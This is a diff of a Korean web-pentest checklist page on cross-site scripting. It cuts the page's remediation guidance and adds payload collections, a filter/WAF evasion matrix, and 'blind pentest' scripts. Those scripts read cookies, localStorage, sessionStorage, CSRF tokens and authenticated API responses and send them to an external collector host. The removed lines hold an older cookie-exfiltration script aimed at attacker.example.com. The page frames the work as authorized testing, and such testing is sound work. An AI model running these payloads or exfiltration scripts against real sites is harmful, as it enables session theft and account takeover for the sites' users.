@@ -1,41 +1,25 @@
 ---
 sidebar_position: 10
-title: 크로스 사이트 스크립팅 (XSS)
-description: 웹 진단 - Cross-Site Scripting (XSS) 점검 절차, 페이로드, 보고서 양식
+title: XSS
+description: 웹 진단 - Cross-Site Scripting (XSS) 컨텍스트 판단, 페이로드, 우회 노트
 keywords: [XSS, Cross-Site Scripting, Reflected, Stored, DOM-based, 입력값 검증, OWASP A05]
 draft: false
 ---
 
-# 크로스 사이트 스크립팅 (Cross-Site Scripting, XSS)
-
-> 공격자가 피해자 브라우저에서 임의의 JavaScript를 실행시키는 취약점.
-> **세션 탈취 / 권한 도용 / 피싱 / 키로깅**으로 이어질 수 있어 실무 빈도가 가장 높은 항목 중 하나.
-
-## 점검 개요
-
-| 항목 | 내용 |
-| :--- | :--- |
-| **분류** | OWASP A05:2025 - Injection / KISA 입력값 검증 |
-| **CWE** | [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html) |
-| **영향도** | 🔴 높음 (세션 쿠키 탈취 가능 시) / 🟡 중간 (Self-XSS 또는 제한된 컨텍스트) |
-| **점검 난이도** | 하 (탐지) / 상 (WAF 우회 시) |
-| **예상 점검 시간** | 페이지당 10~30분 |
-
----
+# 크로스 사이트 스크립팅 (XSS)
 
 ## 점검 목적
 
-사용자 입력값이 **응답 페이지(HTML/JS)에 안전하게 인코딩되지 않은 채 출력**되어, 공격자가 임의 스크립트를 삽입하고 다른 사용자의 브라우저에서 실행시킬 수 있는지 확인한다. 성공 시 **세션 쿠키 탈취, 페이지 변조, 피싱, 권한 도용**이 가능하다.
+사용자 입력값이 HTML, Attribute, JavaScript, URL, DOM sink에 안전하게 인코딩되지 않은 채 들어가는지 확인. 성공 시 같은 origin 권한으로 **페이지 변조, 피싱, 권한 있는 API 호출, 세션 정보 노출**이 가능함.
 
----
 
 ## 유형 구분
 
-| 유형 | 특징 | 영향도 |
+| 유형 | 특징 | 실무 판단 |
 | :--- | :--- | :--- |
-| **Reflected XSS** | 요청 파라미터가 즉시 응답에 반사. 피해자가 공격 링크 클릭해야 발현. | 🟡 중간 |
-| **Stored XSS** | 서버 DB/파일에 페이로드 저장 → 다른 사용자가 페이지 열 때마다 발현. | 🔴 높음 |
-| **DOM-based XSS** | 서버 응답이 아니라 클라이언트 JS가 `location.hash`, `document.referrer` 등을 안전하지 않게 처리. | 🟡 중간 ~ 🔴 높음 |
+| **Reflected XSS** | 요청 파라미터가 즉시 응답에 반사 | 링크 전달 가능성, 로그인 필요 여부, 클릭 필요 여부 확인 |
+| **Stored XSS** | 서버 DB/파일에 저장된 뒤 다른 화면에서 실행 | 관리자/상담원/타 사용자 화면에서 실행되면 우선순위 높음 |
+| **DOM-based XSS** | 서버 응답보다 프론트 JS가 `location`, `postMessage`, storage 값을 위험 sink에 넣음 | Raw response와 실제 DOM을 따로 확인 |
 
 ---
 
@@ -43,241 +27,367 @@ draft: false
 
 ### Step 1. 진입점 식별
 
-사용자 입력이 응답에 반영되는 모든 곳을 후보로:
+사용자 입력이 들어가거나 화면에 다시 출력될 수 있는 곳을 먼저 잡는다.
 
-- URL 파라미터 (`?q=...`, `?search=...`)
-- POST 폼 (검색, 댓글, 게시판, 프로필)
-- HTTP 헤더 (`User-Agent`, `Referer`, 커스텀 헤더)
-- URL 경로 (`/user/<name>` 같은 RESTful)
-- URL Fragment (`#...`) → DOM-based 후보
-- 파일명 / 메타데이터 (업로드 시)
+- URL 파라미터: `?q=...`, `?search=...`, `?next=...`
+- POST/JSON Body: 검색, 댓글, 문의, 게시글, 프로필, 설정값
+- HTTP Header: `User-Agent`, `Referer`, 커스텀 헤더
+- URL Path: `/user/<name>`, `/category/<keyword>`
+- URL Fragment: `#...` DOM-based 후보
+- 파일명/메타데이터: 업로드 파일명, SVG, 이미지 미리보기, 첨부 목록
 
-### Step 2. 반영 여부 확인 (Reflection Probe)
+### Step 2. XSS 진단 루틴
 
-먼저 **고유 마커**를 넣어 응답에 반영되는지 확인:
+Burp Repeater에서 **고유 마커 + 특수문자 + 최소 실행 후보**를 한 번에 넣고, Raw response / Rendered DOM / Console을 같이 본다. 반영 여부, 인코딩, 필터, 컨텍스트를 분리해서 보지 말고 한 번에 판별한다.
 
+**1. 문자/컨텍스트 맵핑**
+
+```text
+xssprobe_9f3'"><>()[]{};:/\`=javascript:confirm(9){{7*7}}${7*7}
 ```
-xss12345namgi
+
+**2. 태그/이벤트 필터 확인**
+
+```html
+xssprobe_9f3'"><svg/onload=confirm(9)><img/src=x onerror=confirm(9)>
 ```
 
-응답에 그대로 들어가면 → 다음 단계. 인코딩되어 있으면 어떤 형태로 인코딩됐는지 확인.
+**3. 컨텍스트 탈출 Polyglot**
 
-### Step 3. 컨텍스트 식별
+```html
+xss'"></script></textarea></title></style></xmp><svg/onload=confirm(document.domain)>
+```
 
-페이로드가 들어가는 위치가 **HTML body**인지, **속성값(attribute)** 안인지, **`<script>` 내부**인지에 따라 페이로드가 달라진다.
-
-| 컨텍스트 | 예시 | 필요한 탈출 |
+| 관찰 결과 | 바로 판단 | 다음 행동 |
 | :--- | :--- | :--- |
-| HTML body | `<div>HERE</div>` | `<script>` 등 새 태그 삽입 |
-| 속성값 (큰따옴표) | `<input value="HERE">` | `"` 로 속성 탈출 후 이벤트 핸들러 |
-| 속성값 (작은따옴표) | `<input value='HERE'>` | `'` 로 탈출 |
-| JS 문자열 내부 | `var x = "HERE"` | `"` / `'` 로 탈출 또는 `</script>` |
-| URL 컨텍스트 | `<a href="HERE">` | `javascript:` 스킴 |
+| 마커가 응답에 없음 | 서버 미반영 또는 다른 저장/렌더링 경로 | 목록/상세/관리자 화면, DOM-only 여부 확인 |
+| `<`, `>`, `"`, `'`가 entity 처리 | HTML/Attribute XSS 가능성 낮음 | JS string, URL, DOM sink로 전환 |
+| `<script>`만 제거 | 태그 블랙리스트 가능성 | `svg`, `img`, `details`, `iframe srcdoc` 확인 |
+| 이벤트 핸들러만 제거 | `onload`, `onerror` 중심 필터 가능성 | `onfocus`, `ontoggle`, `onanimationstart`, SVG `onbegin` 확인 |
+| 공백/슬래시가 변형 | 단순 정규식 필터 가능성 | `<svg/onload=...>`, `%09`, `%0a`, unquoted attribute 확인 |
+| Raw는 안전한데 DOM에서 태그 생성 | 프론트 렌더링 변형 또는 DOM XSS | Elements/Console 기준으로 재판정 |
+| CSP violation 발생 | sink는 있으나 실행 차단 | CSP 정책은 `security-headers.md`와 같이 확인 |
 
-### Step 4. 페이로드 삽입 및 실행 확인
+### Step 3. 컨텍스트별 빠른 선택
 
-컨텍스트에 맞춰 최소 페이로드부터 시도 → 차단 시 우회.
+마커가 반영된 위치를 보고 아래에서 바로 골라 넣는다. XSS는 “센 payload”보다 **컨텍스트에 맞는 탈출 문자**가 먼저다.
 
-### Step 5. 영향 입증 (PoC)
+| 반영 위치 | 먼저 넣을 payload | 볼 것 |
+| :--- | :--- | :--- |
+| HTML body: `<div>HERE</div>` | `<svg/onload=confirm(document.domain)>` | 태그가 DOM에 생성되는지 |
+| Attribute: `<input value="HERE">` | `" autofocus onfocus=confirm(document.domain) x="` | 속성 탈출 후 이벤트가 붙는지 |
+| Attribute: `<input value='HERE'>` | `' autofocus onfocus=confirm(document.domain) x='` | 작은따옴표 탈출 가능 여부 |
+| JS string: `var x = "HERE"` | `";confirm(document.domain);//` | 문자열 탈출 후 JS 구문 실행 여부 |
+| Script block 내부 | `</script><svg/onload=confirm(document.domain)>` | script 종료 후 HTML 파싱 여부 |
+| URL/href | `javascript:confirm(document.domain)` | 실제 clickable/navigable sink인지 |
+| JSON 응답 | `<img/src=x onerror=confirm(document.domain)>` | 프론트가 `.html()`, `innerHTML`로 렌더링하는지 |
+| DOM source | `#<img/src=x onerror=confirm(document.domain)>` | Raw response가 아니라 실제 DOM 기준으로 확인 |
 
-단순 `alert(1)`이 아니라 **실제 위협 입증**:
-- `document.domain` 출력 (Same-origin 확인)
-- `document.cookie` 출력 (HttpOnly 여부 확인)
-- 외부 서버로 쿠키 전송 시뮬레이션
+### Step 4. Stored / DOM / 영향 확인
+
+- Stored XSS는 저장 요청만 보지 말고 **목록 / 상세 / 관리자 / 알림 / 엑셀/HTML 미리보기**까지 따라간다.
+- DOM XSS는 Burp response보다 브라우저 Elements, Sources, Console을 우선한다.
+- 영향 입증은 단순 팝업보다 **피해자 권한으로 같은 origin 동작이 가능한지**를 보여주는 게 좋다.
+- `document.cookie`는 HttpOnly 여부 확인용으로만 보고, 실제 외부 전송은 사전 협의된 수신 서버에서만 수행한다.
 
 ---
 
-## 페이로드 / 테스트 케이스
+## 페이로드 노트
 
-### 케이스 1: 기본 탐지 (HTML body 컨텍스트)
+평소에는 `Step 2`와 `Step 3`만으로 대부분 갈린다. 아래는 컨텍스트가 확정됐거나 필터가 보일 때 바로 가져다 쓰는 payload 모음이다.
 
-```html
-<script>alert(document.domain)</script>
-```
+### HTML body 컨텍스트
 
-**판정:** 응답 HTML에 위 태그가 그대로 포함되고, 브라우저에서 alert이 뜨면 취약.
-
-### 케이스 2: 속성값 컨텍스트 탈출
+입력값이 태그 밖 텍스트 영역에 그대로 출력될 때 사용한다.
 
 ```html
-" onmouseover="alert(document.domain)
-" autofocus onfocus="alert(document.domain)
+<script>confirm(document.domain)</script>
+<svg/onload=confirm(document.domain)>
+<img/src=x onerror=confirm(document.domain)>
+<details open ontoggle=confirm(document.domain)>
+<iframe srcdoc="<svg onload=confirm(document.domain)>"></iframe>
 ```
 
-**예시 응답:** `<input value="" onmouseover="alert(document.domain)">`
+`<script>`가 막혀도 `svg`, `img`, `details`, `iframe srcdoc` 같은 대체 태그가 살아남는지 본다.
 
-### 케이스 3: `<script>` 태그가 필터될 때
+### Attribute 컨텍스트
+
+입력값이 `<input value="HERE">`, `<a title="HERE">` 같은 속성값에 들어갈 때 사용한다.
 
 ```html
-<img src=x onerror=alert(document.domain)>
-<svg onload=alert(document.domain)>
-<details open ontoggle=alert(document.domain)>
-<iframe srcdoc="<script>alert(document.domain)</script>">
+" onmouseover="confirm(document.domain)
+" autofocus onfocus="confirm(document.domain)
+" autofocus onfocus=confirm(document.domain) x="
+' autofocus onfocus=confirm(document.domain) x='
+" onmouseover=confirm(document.domain) x="
 ```
 
-### 케이스 4: 키워드/문자 필터 우회
+생성 예시는 아래처럼 속성을 닫고 새 이벤트 핸들러가 붙는 형태다.
 
 ```html
-<!-- 대소문자 변형 -->
-<sCrIpT>alert(1)</sCrIpT>
-
-<!-- 공백 대신 / 활용 -->
-<img/src=x/onerror=alert(1)>
-
-<!-- 괄호 차단 시 -->
-<svg onload=alert`1`>
-
-<!-- 'alert' 단어 차단 시 -->
-<svg onload=eval(atob('YWxlcnQoMSk='))>
-
-<!-- HTML 엔티티 인코딩 -->
-<a href="javas&#99;ript:alert(1)">click</a>
+<input value="" autofocus onfocus=confirm(document.domain) x="">
 ```
 
-### 케이스 5: DOM-based XSS
+사용자 interaction이 필요한 `onmouseover`보다 `autofocus onfocus`가 먼저 먹히는지 확인한다.
 
+### JavaScript 문자열 / script block
+
+입력값이 JS 변수, 문자열, template literal, `<script>` 내부에 들어갈 때 사용한다.
+
+```javascript
+';confirm(document.domain);//
+";confirm(document.domain);//
+\';confirm(document.domain);//
+\");confirm(document.domain);//
+</script><svg/onload=confirm(document.domain)>
+${confirm(document.domain)}
+`-confirm(document.domain)-`
 ```
-https://<TARGET>/page#<img src=x onerror=alert(document.domain)>
-https://<TARGET>/?redirect=javascript:alert(document.domain)
+
+quote가 백슬래시로 escape되는 환경은 `\';...//`처럼 escape 문자를 다시 깨는지 본다.
+
+### URL / href / redirect 컨텍스트
+
+입력값이 `<a href="HERE">`, redirect URL, link-like 필드에 들어갈 때 사용한다.
+
+```html
+javascript:confirm(document.domain)
+JaVaScRiPt:confirm(document.domain)
+java&#x73;cript:confirm(document.domain)
+java&#115;cript:confirm(document.domain)
+data:text/html,<svg onload=confirm(document.domain)>
 ```
 
-→ 코드에서 `location.hash`, `location.search`, `document.referrer` 등이 `innerHTML`, `document.write`, `eval`로 흘러가는지 확인.
+문자열 저장만으로는 부족하다. 링크 클릭, 리다이렉트, `location.href` 할당처럼 실제 navigation sink인지 확인한다.
 
-### 케이스 6: 영향 입증용 — 쿠키 탈취 PoC
+### DOM-based XSS
+
+서버 응답에는 payload가 없거나 안전해 보이는데 프론트 JS가 URL/DOM 값을 읽어 위험 sink에 넣는 경우다.
+
+```text
+https://<TARGET>/page#<img/src=x onerror=confirm(document.domain)>
+https://<TARGET>/page?next=javascript:confirm(document.domain)
+https://<TARGET>/page?msg='"><svg/onload=confirm(document.domain)>
+```
+
+확인할 source:
+
+```text
+location.href
+location.search
+location.hash
+document.referrer
+window.name
+postMessage data
+localStorage / sessionStorage
+```
+
+위험 sink:
+
+```text
+innerHTML / outerHTML / insertAdjacentHTML
+document.write
+eval / Function / setTimeout(string)
+location / src / href 동적 할당
+```
+
+### Stored XSS 확인 흐름
+
+게시글, 댓글, 문의, 파일명, 프로필처럼 저장되는 입력값은 저장 위치와 실행 위치가 다를 수 있다.
+
+```http
+POST /api/inquiry/write HTTP/1.1
+Host: <TARGET>
+Content-Type: application/x-www-form-urlencoded
+Cookie: SESSION=<USER_SESSION>
+
+category=qna&title=<img/src=x onerror=confirm(document.domain)>&content=test
+```
+
+확인은 저장 요청이 아니라 조회 경로까지 이어서 한다.
+
+```http
+GET /api/inquiry/list HTTP/1.1
+Host: <TARGET>
+
+GET /api/inquiry/detail?id=<ID> HTTP/1.1
+Host: <TARGET>
+```
+
+작성자 화면에서는 안 터져도 관리자/상담원/목록 페이지에서 실행되면 Stored XSS로 본다.
+
+### SVG / 파일명 / 업로드 기반 XSS
+
+이미지 업로드, 파일 첨부, 파일 목록 출력에서 자주 본다.
+
+```xml
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" onload="confirm(document.domain)">
+</svg>
+```
+
+파일명 기반:
+
+```text
+"><img src=x onerror=confirm(document.domain)>.jpg
+<svg onload=confirm(document.domain)>.png
+```
+
+`<img src="uploaded.svg">`로는 브라우저 정책상 스크립트가 안 도는 경우가 있다. 직접 열기, `object/embed`, 관리자 렌더링, 미리보기 경로를 따로 본다.
+
+### 영향 입증 payload
+
+쿠키 탈취보다 “같은 origin 권한으로 JS 실행”을 보여주는 쪽이 실무 보고에 더 안정적이다.
+
+```html
+<svg/onload=confirm(document.domain)>
+```
 
 ```html
 <script>
-fetch('https://attacker.example.com/?c=' + encodeURIComponent(document.cookie));
+document.body.insertAdjacentHTML('afterbegin', '<h1>XSS Executed: ' + document.domain + '</h1>');
 </script>
 ```
 
-> ⚠️ **실무 주의**: 실제 외부 송신 PoC는 사전 협의 필수. 가능하면 `document.cookie`를 화면에 표시하거나, 사내 협의된 수신 서버로만 전송.
+```html
+<script>
+fetch('/api/me', {credentials:'include'})
+  .then(r => r.text())
+  .then(t => document.body.insertAdjacentHTML('beforeend', '<pre>' + t.replace(/[<>&]/g, '_') + '</pre>'));
+</script>
+```
+
+관리자 화면에서 실행되거나 인증 API가 피해자 권한으로 호출되면 영향도가 올라간다.
+
+---
+
+## 필터 / WAF 우회 매트릭스
+
+무작정 payload를 늘리지 말고, Burp response에서 **무엇이 제거됐는지** 보고 좁혀간다.
+
+| 필터 증상 | 우회 방향 | 예시 |
+| :--- | :--- | :--- |
+| `<script>` 제거 | script 대체 태그 | `<svg/onload=...>`, `<img/src=x onerror=...>` |
+| 공백 제거 | slash, tab, newline, unquoted attribute | `<svg/onload=...>`, `%09`, `%0a` |
+| quote 제거 | unquoted attribute, backtick | `<input autofocus onfocus=...>` |
+| 괄호 제거 | tagged template | `` confirm`xss` `` |
+| `alert` 차단 | 다른 실행 함수 | `confirm`, `prompt`, `print`, `top['alert'](1)` |
+| `onload` / `onerror` 차단 | 다른 이벤트 | `onfocus`, `ontoggle`, `onanimationstart`, SVG `onbegin` |
+| `javascript:` 차단 | 인코딩/대소문자 변형 | `JaVaScRiPt:`, `java&#x73;cript:` |
+| `<`, `>` entity 처리 | 다른 컨텍스트로 전환 | JS string, URL, DOM sink |
+| CSP inline 차단 | CSP 정책 검토 | nonce, allowlist, JSONP, `unsafe-inline` 여부 |
+
+### 우회 payload 예시 모음
+
+```html
+<!-- script 대체 -->
+<svg/onload=confirm(document.domain)>
+<img/src=x onerror=confirm(document.domain)>
+<details/open/ontoggle=confirm(document.domain)>
+
+<!-- 이벤트 다양화 -->
+<input autofocus onfocus=confirm(document.domain)>
+<style>@keyframes x{}</style><xss style=animation-name:x onanimationstart=confirm(document.domain)>
+<svg><animate attributeName=x onbegin=confirm(document.domain)></animate></svg>
+
+<!-- 문자/키워드 우회 -->
+<svg/onload=confirm`xss`>
+<svg/onload=top['confirm'](document.domain)>
+<a href=java&#x73;cript:confirm(document.domain)>click</a>
+<a href=javascript:confirm(String.fromCharCode(88,83,83))>click</a>
+```
 
 ---
 
 ## 취약 판정 기준
 
-다음 중 **하나라도** 해당하면 취약:
+다음 중 하나라도 해당하면 취약으로 본다.
 
-- [ ] 페이로드가 응답 HTML/JS에 **무인코딩**으로 포함되어 브라우저에서 JavaScript가 실행됨
-- [ ] `document.domain`이 정상 alert 으로 출력됨
-- [ ] `document.cookie`가 출력되며 HttpOnly 플래그가 없어 탈취 가능
-- [ ] Stored 형태로 저장되어 다른 세션에서도 실행됨
+- [ ] 페이로드가 응답 HTML/JS에 무인코딩으로 포함되어 브라우저에서 JavaScript가 실행됨
+- [ ] `document.domain`, `print()`, DOM 변조 등으로 같은 origin에서 스크립트 실행이 확인됨
+- [ ] Stored 형태로 저장되어 다른 세션/권한 화면에서도 실행됨
+- [ ] JSON/API 응답 자체는 문자열이지만 프론트 렌더링 과정에서 DOM에 태그/이벤트가 생성됨
 
-다음 경우는 **취약 아님** 또는 **저영향**:
+다음은 취약 아님 또는 저영향으로 분리한다.
 
-- [ ] `<`, `>`, `"`, `'`가 모두 HTML 엔티티로 인코딩되어 출력됨 (`&lt;`, `&gt;`)
-- [ ] CSP에 의해 인라인 스크립트가 차단되어 실행 불가 (단, CSP 정책 자체의 우회 가능성은 별도 검토)
-- [ ] Self-XSS — 본인만 트리거 가능하며 외부 전달 경로 없음
-
----
-
-## PoC 양식 (보고서 붙여넣기용)
-
-**[Reflected XSS] - 검색 페이지 q 파라미터**
-
-1. `<TARGET>` 로그인 후 검색 페이지(`/search`) 접근
-2. URL의 `q` 파라미터에 아래 페이로드 삽입
-3. 응답 페이지에서 alert 창 발현 확인
-
-**요청 (Request):**
-
-```http
-GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
-Host: <TARGET>
-Cookie: SESSION=abcd1234
-```
-
-**응답 (Response) — 취약 발현 증거:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html; charset=utf-8
-
-<html>
-  ...
-  <h2>검색 결과: <script>alert(document.domain)</script></h2>
-  ...
-</html>
-```
-
-**확인 사항:**
-- 응답 HTML에 `<script>` 태그가 인코딩 없이 그대로 포함됨
-- 브라우저에서 페이지 로딩 시 `alert` 창에 도메인이 출력됨 (스크린샷 첨부)
-- 응답 헤더에 `Content-Security-Policy` 미설정
+- [ ] `<`, `>`, `"`, `'`가 모두 HTML entity로 인코딩되어 실행 컨텍스트를 만들 수 없음
+- [ ] CSP로 인라인 실행이 차단되고, 우회 가능한 sink/allowlist가 확인되지 않음
+- [ ] Self-XSS로 본인만 트리거 가능하며 외부 전달 경로가 없음
 
 ---
 
-## 영향도 분석
+## 블라인드 모의해킹 확장
 
-- **기밀성 (Confidentiality)**: 🔴 세션 쿠키 / 로컬스토리지 / 화면 표시 데이터 탈취 가능
-- **무결성 (Integrity)**: 🔴 사용자 화면 변조, 임의 액션 수행 (CSRF 토큰 우회 포함)
-- **가용성 (Availability)**: 🟡 사용자 단위 가용성 영향 (리다이렉트, 무한 alert 등)
+취약점 진단에서는 JavaScript 실행 확인으로 멈추지만, 블라인드 모의해킹에서는 **피해자 권한으로 어디까지 동작 가능한지**를 확인한다.
 
-**비즈니스 임팩트:**
-관리자 권한 사용자가 Stored XSS 페이지에 접근할 경우 세션 탈취로 **관리자 계정 도용**까지 이어질 수 있다. 인증된 사용자의 모든 동작을 공격자가 수행 가능하며, 피싱 페이지 삽입으로 자격증명 추가 탈취도 가능하다.
+| 단계 | 확인할 것 | 증거 기준 |
+| :--- | :--- | :--- |
+| 1. 실행 주체 | 어느 계정/권한 화면에서 실행되는지 | `document.domain`, 현재 path, 사용자 식별 API |
+| 2. 세션/토큰 접근 | JS에서 읽히는 쿠키, storage, CSRF token | 승인된 collector 수신 로그 |
+| 3. 권한 API 접근 | 피해자 세션으로 내부 API 호출 가능 여부 | `/api/me`, 관리자 API 응답 샘플 |
+| 4. 액션 수행 | 피해자 권한으로 상태 변경 요청이 가능한지 | 테스트 데이터 또는 영향 낮은 액션 성공 |
 
----
+### 권한 API 확인
 
-## 대응방안
+팝업만으로 끝내지 말고 같은 origin에서 인증 API가 호출되는지 본다. 응답 일부를 collector로 전송해 피해자 권한 API 접근을 입증한다.
 
-### 개발자 관점
-
-1. **출력 인코딩 (Output Encoding)** — 컨텍스트별로 인코딩 적용:
-   - HTML body → HTML 엔티티 인코딩 (`<` → `&lt;`)
-   - 속성값 → 속성 인코딩 + 큰따옴표로 감싸기
-   - JS 문자열 → JS 유니코드 이스케이프 (`<`)
-   - URL → URL 인코딩
-
-2. **안전한 템플릿 엔진 사용** — Auto-escape 기본 활성:
-   - React (`{변수}` 사용 시 자동 escape, `dangerouslySetInnerHTML` 사용 금지)
-   - Vue (`{{ 변수 }}` 자동 escape, `v-html` 사용 금지)
-   - Thymeleaf, Mustache, Twig 등
-
-3. **DOMPurify 등 라이브러리 활용** — HTML 입력을 허용해야 할 때 (Rich text editor 등):
-   ```javascript
-   import DOMPurify from 'dompurify';
-   const clean = DOMPurify.sanitize(userInput);
-   ```
-
-4. **`innerHTML`, `document.write`, `eval` 사용 지양** — 대신 `textContent`, `setAttribute` 활용.
-
-### 운영자 관점
-
-1. **Content-Security-Policy (CSP) 헤더 설정** — 인라인 스크립트 차단:
-   ```
-   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none';
-   ```
-
-2. **쿠키에 `HttpOnly` 속성 설정** — XSS로 쿠키 탈취 차단.
-
-3. **`X-XSS-Protection` 헤더는 더 이상 권장되지 않음** — CSP로 대체.
-
-4. **WAF 룰 적용** — `<script>`, `onerror=`, `javascript:` 등 패턴 탐지 (보조 수단).
-
-### 안전한 예시 코드
-
-```python
-# Python (Jinja2 — 자동 escape)
-{{ user_input }}  # 자동으로 HTML escape
-
-# 명시적 escape 필요한 경우
-from markupsafe import escape
-return f"<div>{escape(user_input)}</div>"
+```html
+<script>
+fetch('/api/me', {credentials: 'include'})
+  .then(r => r.text())
+  .then(t => {
+    const sample = t.slice(0, 800);
+    navigator.sendBeacon('https://<APPROVED-COLLECTOR>/xss-api',
+      JSON.stringify({caseId: 'xss-001', path: location.pathname, sample}));
+  });
+</script>
 ```
+
+API 경로는 서비스 구조에 맞춰 `/api/me`, `/api/profile`, `/api/session`, `/api/user/info`처럼 자기 정보 조회 API를 우선한다. 관리자 화면 Stored XSS라면 관리자 전용 API 호출, 권한 화면 접근, 중요 기능 호출 가능성을 단계적으로 확인한다.
+
+### 세션 / 토큰 수집 확인
+
+JS에서 접근 가능한 쿠키, storage, CSRF token을 collector로 전송해 실제 탈취 가능성을 증명한다.
+
+```html
+<script>
+const token = document.querySelector('input[name=csrf], meta[name=csrf-token]')?.value
+  || document.querySelector('meta[name=csrf-token]')?.content
+  || '';
+navigator.sendBeacon('https://<APPROVED-COLLECTOR>/xss-cred',
+  JSON.stringify({
+    caseId: 'xss-001',
+    path: location.pathname,
+    cookie: document.cookie,
+    localStorage: {...localStorage},
+    sessionStorage: {...sessionStorage},
+    csrf: token
+  }));
+</script>
+```
+
+HttpOnly 쿠키는 JS로 읽히지 않지만, 같은 origin API 호출에는 자동 포함된다. 따라서 쿠키 원문 수집 실패가 영향 없음은 아니다.
+
+### 액션 가능성 확인
+
+권한 있는 API 호출이 가능하면 비파괴 요청부터 본다.
 
 ```javascript
-// JavaScript — innerHTML 대신 textContent
-element.textContent = userInput;  // 안전
-// element.innerHTML = userInput;   // 위험
+fetch('/api/notifications?limit=1', {credentials: 'include'})
+  .then(r => r.text())
+  .then(t => console.log(t.slice(0, 300)));
 ```
+
+상태 변경은 테스트 데이터가 있으면 우선 사용하고, 필요하면 영향이 낮고 되돌릴 수 있는 실데이터 액션까지 확인한다.
 
 ---
 
 ## 참고자료
 
 - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
 - [PortSwigger - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
+- [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 - [HTML5 Security Cheatsheet](https://html5sec.org/)
 - [DOMPurify](https://github.com/cure53/DOMPurify)
